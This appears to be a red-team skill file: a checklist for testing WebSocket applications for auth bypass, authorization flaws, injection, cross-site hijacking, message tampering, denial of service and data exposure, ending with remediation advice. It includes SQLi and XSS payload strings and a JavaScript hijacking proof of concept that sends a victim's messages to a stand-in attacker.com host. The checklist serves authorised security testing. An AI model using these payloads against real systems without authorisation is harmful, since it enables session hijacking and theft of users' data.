---
name: websocket-testing
description: WebSocket security testing — injection, auth bypass, hijacking
origin: RedteamOpencode
---

# WebSocket Security Testing

## When to Activate

- Application uses WebSocket connections (`ws://` or `wss://`)
- Real-time features: chat, notifications, live updates, trading
- `Upgrade: websocket` observed in HTTP traffic

## Tools

- Burp Suite (WebSocket history + Repeater)
- Browser DevTools (Network → WS tab)
- websocat (CLI WebSocket client)
- OWASP ZAP (WebSocket support)
- Custom scripts (Python websockets library)

## Methodology

### 1. Discover and Map

- [ ] Identify WebSocket endpoints in JavaScript source
- [ ] Check for `ws://` (unencrypted) vs `wss://` (TLS)
- [ ] Monitor WebSocket handshake headers
- [ ] Map all message types and structures (JSON, binary, text)
- [ ] Document message flow: client→server and server→client

### 2. Authentication Testing

- [ ] Connect without authentication token — does it succeed?
- [ ] Remove or modify auth token in handshake request
- [ ] Use expired or invalid token
- [ ] Test if auth is checked only at handshake or per-message
- [ ] Replay handshake with stolen cookies/tokens

### 3. Authorization Testing

- [ ] Send messages intended for other users
- [ ] Subscribe to channels/rooms without permission
- [ ] Modify user ID or room ID in messages
- [ ] Access admin-only message types with user token
- [ ] Test IDOR in WebSocket message parameters

### 4. Injection Attacks

- [ ] SQLi in message parameters: `' OR 1=1--`
- [ ] XSS: inject `<script>alert(1)</script>` — check if rendered to other users
- [ ] Command injection in server-processed fields
- [ ] NoSQL injection if backend uses MongoDB
- [ ] SSTI in template-rendered message content

### 5. Cross-Site WebSocket Hijacking (CSWSH)

- [ ] Check if Origin header is validated during handshake
- [ ] Create PoC page on attacker domain:
      ```javascript
      var ws = new WebSocket('wss://target.com/ws');
      ws.onmessage = function(e) {
        fetch('https://attacker.com/log?d=' + btoa(e.data));
      };
      ```
- [ ] Test if victim's cookies are sent with cross-origin WS handshake
- [ ] Verify data exfiltration from victim's session

### 6. Message Manipulation

- [ ] Modify message content in transit (Burp intercept)
- [ ] Replay previous messages — check for nonce/sequence validation
- [ ] Send out-of-order messages
- [ ] Send malformed/oversized messages — check error handling
- [ ] Binary message tampering

### 7. Denial of Service

- [ ] Open many concurrent connections — test connection limits
- [ ] Send rapid messages — test rate limiting
- [ ] Send extremely large messages — test size limits
- [ ] Send ping floods
- [ ] Keep connections idle — test timeout enforcement

### 8. Data Exposure

- [ ] Monitor all incoming messages for sensitive data
- [ ] Check if server broadcasts data meant for other users
- [ ] Test if connection receives other users' events
- [ ] Check for verbose error messages over WebSocket

## What to Record

- WebSocket endpoint URL and protocol
- Authentication mechanism (or lack thereof)
- Vulnerability type and proof payload
- Data exposed or action performed
- CSWSH PoC if Origin not validated
- Severity: Critical (data theft, RCE) to Medium (DoS, info leak)
- Remediation: validate Origin, authenticate per-message, rate limit, input validate
